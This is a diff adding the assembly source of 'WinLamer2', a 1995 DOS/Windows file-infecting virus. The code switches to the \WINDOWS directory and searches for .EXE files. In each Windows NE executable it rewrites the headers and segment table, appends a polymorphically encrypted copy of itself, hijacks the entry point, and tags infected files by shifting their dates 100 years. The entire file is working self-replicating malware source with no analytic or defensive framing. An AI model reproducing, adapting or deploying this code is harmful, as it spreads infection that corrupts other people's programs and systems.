@@ -1,0 +1,398 @@
+
+;       WinLamer2 by burglar (C)Copyright June, 1995. All rights reserved.
+;       Using TASM v4.0...
+
+        .286
+        .MODEL  TINY
+        .CODE
+z:
+        EXTRN   PMEW:NEAR, PMEW_END:NEAR
+
+        pushf
+        pusha
+        push    ds
+        push    es
+
+        mov     ax,1686h        ;is dpmi available ?
+        int     2fh
+        or      ax,ax
+        jz      dpmi_exist
+exit:
+        pop     es
+        pop     ds
+        popa
+        popf
+
+        DB      0eah
+relocIP DW      0
+relocCS DW      0ffffh
+
+dpmi_exist:
+;       initial period... allocate a mem block using dpmi...
+
+        mov     ax,0501h        ;allocate mem block.
+        mov     cx,0ffffh
+        xor     bx,bx
+        int     31h
+        push    si              ;mem handle.
+        push    di
+        push    bx              ;32 bits linear address.
+        push    cx
+
+        xor     ax,ax           ;allocate LDT descriptor.
+        mov     cx,1
+        int     31h
+
+        mov     bx,ax           ;set segment base address.
+        mov     ax,7
+        pop     dx
+        pop     cx
+        int     31h
+
+        mov     ax,8            ;set segment limit.
+        mov     dx,0ffffh
+        xor     cx,cx
+        int     31h
+
+        mov     ax,9
+        mov     cl,11110010b    ;r/w data segment.
+        xor     ch,ch
+        int     31h
+
+        mov     ds,bx           ;selector.
+
+        pop     [z.mem_hnd+2]   ;mem handle.
+        pop     [z.mem_hnd]
+
+;       ok! above code has allocated a 64k-1 mem block...
+
+        call    adj
+adj:
+        pop     ax
+        sub     ax,OFFSET adj
+        mov     [z._base],ax
+
+;       now, search .EXE files to infect...
+
+        mov     ah,2fh          ;get current DTA...
+        int     21h
+        mov     [z.DTA],bx
+        mov     [z.DTA+2],es
+
+        mov     si,OFFSET cur_dir       ;get current dir...
+        xor     dl,dl
+        mov     ah,47h
+        int     21h
+
+        mov     dx,OFFSET win_path      ;set current dir to \Windows...
+        add     dx,[z._base]
+        push    ds
+        push    cs
+        pop     ds
+        mov     ah,3bh
+        int     21h
+        pop     ds
+
+        mov     ah,4eh          ;search first .EXE...
+        xor     cx,cx
+        mov     dx,OFFSET wild_exe
+        add     dx,[z._base]
+        push    ds              ;keep selector...
+        push    cs
+        pop     ds
+        int     21h
+        pop     ds
+        jnc     found_exe
+
+        call    free
+
+        jmp     exit
+
+close_exe:
+        mov     ah,3eh                  ;close file...
+        int     21h
+
+        mov     ah,4fh                  ;search next...
+        int     21h
+        jnc     found_exe
+
+        mov     dx,OFFSET cur_dir       ;restore current dir...
+        mov     ah,3bh
+        int     21h
+
+        call    free
+
+        jmp     exit
+
+found_exe:
+;       found .EXE file, infect it if it is a Win prog and it hasn't infected.
+
+        push    ds
+        lds     si,DWORD PTR [z.DTA]
+        cmp     WORD PTR [si+18h],0c800h        ;already infected ?!
+        jb      chk_MZ_NE
+        pop     ds
+        jmp     close_exe
+
+chk_MZ_NE:
+        lea     dx,[si+1eh]                     ;open file...
+        mov     ax,3d02h
+        int     21h
+
+        pop     ds                              ;read old style header...
+        mov     dx,OFFSET old_hdr
+        mov     bx,ax
+        mov     cx,40h
+        mov     ah,3fh
+        int     21h
+
+        cmp     WORD PTR [z.old_hdr],'ZM'       ;.exe file ?!
+        jne     close_exe
+        cmp     [z.old_hdr+18h],WORD PTR 40h
+        jb      close_exe
+        mov     dx,WORD PTR [z.old_hdr+3ch]
+        mov     cx,WORD PTR [z.old_hdr+3eh]
+        mov     ax,4200h
+        int     21h
+
+        mov     dx,OFFSET new_hdr               ;read new style header...
+        mov     cx,40h
+        mov     ah,3fh
+        int     21h
+
+        cmp     WORD PTR [z.new_hdr],'EN'       ;New Executable file ?!
+        jne     close_exe
+        mov     al,[z.new_hdr+36h]
+        and     al,2
+        jz      close_exe
+
+
+ok_to_infect:
+;       ok! the .EXE can be infected... let's infect it!
+
+        sub     WORD PTR [z.old_hdr+10h],8
+        sub     WORD PTR [z.old_hdr+3ch],8
+        sbb     WORD PTR [z.old_hdr+3eh],0
+        add     WORD PTR [z.new_hdr+4],8
+        add     WORD PTR [z.new_hdr+24h],8
+        add     WORD PTR [z.new_hdr+26h],8
+        add     WORD PTR [z.new_hdr+28h],8
+        add     WORD PTR [z.new_hdr+2ah],8
+
+        push    WORD PTR [z.new_hdr+14h]        ;original IP...
+        pop     [z.host_ip]
+        push    WORD PTR [z.new_hdr+16h]        ;original CS number...
+        pop     [z.host_cs]
+
+        mov     WORD PTR [z.new_hdr+14h],0      ;new IP...
+        inc     WORD PTR [z.new_hdr+1ch]
+        push    WORD PTR [z.new_hdr+1ch]
+        pop     WORD PTR [z.new_hdr+16h]        ;new CS number...
+
+        xor     cx,cx                   ;lseek to start of file...
+        xor     dx,dx
+        mov     ax,4200h
+        int     21h
+
+        mov     dx,OFFSET old_hdr       ;write old style header...
+        mov     cx,40h
+        mov     ah,40h
+        int     21h
+
+        mov     dx,WORD PTR [z.old_hdr+3ch]     ;lseek to start of new header...
+        mov     cx,WORD PTR [z.old_hdr+3eh]
+        mov     ax,4200h
+        int     21h
+
+        mov     dx,OFFSET new_hdr       ;write new executable header...
+        mov     cx,40h
+        mov     ah,40h
+        int     21h
+
+        xor     cx,cx                   ;lseek down by 8 bytes...
+        mov     dx,8
+        mov     ax,4201h
+        int     21h
+
+        mov     dx,OFFSET temp
+        mov     cx,WORD PTR [z.new_hdr+1ch]
+        dec     cx
+        shl     cx,3
+        push    cx                      ;seg table length...
+        mov     ah,3fh
+        int     21h
+
+        pop     dx
+        push    dx
+        add     dx,8
+        neg     dx
+        mov     cx,-1
+        mov     ax,4201h
+        int     21h
+
+        mov     dx,OFFSET temp
+        pop     cx
+        mov     ah,40h
+        int     21h
+
+        xor     cx,cx
+        xor     dx,dx
+        mov     ax,4201h
+        int     21h
+
+        push    dx
+        push    ax
+
+        xor     cx,cx                   ;get file length...
+        xor     dx,dx
+        mov     ax,4202h
+        int     21h
+
+        push    dx                      ;file length...
+        push    ax
+
+        mov     cx,WORD PTR [z.new_hdr+32h]     ;alignment shift count...
+        mov     ax,1
+        shl     ax,cl                   ;logical sector length...
+        mov     [z.log_sec_len],ax
+        mov     cx,ax
+        pop     ax
+        pop     dx
+        div     cx
+        or      dx,dx                   ;any remainder?!
+        jz      no_rmd
+        inc     ax
+no_rmd:
+;       ax=logical-sector offset...
+
+        mov     [z.log_sec_ofs],ax
+
+        mov     si,[z._base]
+        push    ds
+        pop     es
+        push    cs
+        pop     ds
+        mov     di,OFFSET temp
+        mov     cx,OFFSET PMEW_END
+        cld
+rep     movsb
+        push    es
+        pop     ds
+        mov     si,OFFSET temp
+        mov     WORD PTR [si+relocIP],0
+        mov     WORD PTR [si+relocCS],0ffffh
+
+        mov     si,OFFSET temp
+        mov     di,8000h
+        mov     [z.rlc_inf],1                   ;one relocatable item...
+        mov     [z.rlc_inf+2],OFFSET relocIP
+        mov     ax,OFFSET rlc_inf
+        push    ds
+        pop     dx
+        mov     cx,OFFSET PMEW_END
+
+        call    PMEW
+
+        mov     [z.poly_len],cx
+
+        add     cx,OFFSET PMEW_END
+        push    [z.log_sec_ofs]
+        pop     [z.my_seg_entry]
+        mov     [z.my_seg_entry+2],cx
+        mov     [z.my_seg_entry+4],180h
+        mov     [z.my_seg_entry+6],cx
+
+        pop     dx
+        pop     cx
+        mov     ax,4200h
+        int     21h
+
+        mov     dx,OFFSET my_seg_entry  ;write virii seg tbl entry...
+        mov     cx,8
+        mov     ah,40h
+        int     21h
+
+        mov     ax,[z.log_sec_ofs]
+        mov     cx,[z.log_sec_len]
+        mul     cx
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200h
+        int     21h
+
+        mov     dx,8000h                ;write virii body...
+        mov     cx,[z.poly_len]
+        add     cx,OFFSET PMEW_END
+        mov     ah,40h
+        int     21h
+
+        mov     WORD PTR [z.reloc_data],1
+        mov     BYTE PTR [z.reloc_data+2],3
+        mov     BYTE PTR [z.reloc_data+3],4
+        push    [z.poly_len]
+        pop     WORD PTR [z.reloc_data+4]
+        add     WORD PTR [z.reloc_data+4],OFFSET relocIP
+
+        mov     dx,OFFSET reloc_data    ;write relocation item...
+        mov     cx,10
+        mov     ah,40h
+        int     21h
+
+        push    ds
+        lds     si,DWORD PTR [z.DTA]  ;add date to 100 years...
+        mov     cx,[si+16h]
+        mov     dx,[si+18h]
+        add     dx,0c800h
+        mov     ax,5701h
+        int     21h
+        pop     ds
+
+        jmp     close_exe               ;continue to infect...
+
+
+free    PROC    NEAR
+        mov     ax,0502h                ;free mem block...
+        mov     si,[z.mem_hnd]
+        mov     di,[z.mem_hnd+2]
+        int     31h
+
+        ret
+free    ENDP
+
+wild_exe        DB      '*.EXE',0
+win_path        DB      '\WINDOWS',0
+copr            DB      'WinLamer2 '
+                DB      '(C)Copyright Aug, 1995 by Burglar in Taipei, Taiwan.'
+
+vir_end:
+
+var             STRUC
+_base           DW      ?
+mem_hnd         DW      ?
+                DW      ?
+DTA             DW      ?
+                DW      ?
+old_hdr         DB      40h dup (?)
+new_hdr         DB      40h dup (?)
+log_sec_len     DW      ?
+cur_dir         DB      64 dup (?)
+poly_len        DW      ?
+log_sec_ofs     DW      ?
+my_seg_entry    DW      ?
+                DW      ?
+                DW      ?
+                DW      ?
+reloc_data      DW      ?
+                DB      ?
+                DB      ?
+                DW      ?
+host_cs         DW      ?
+host_ip         DW      ?
+rlc_inf         DW      ?
+                DW      ?
+temp            DB      ?
+var             ENDS
+
+        END
+
+
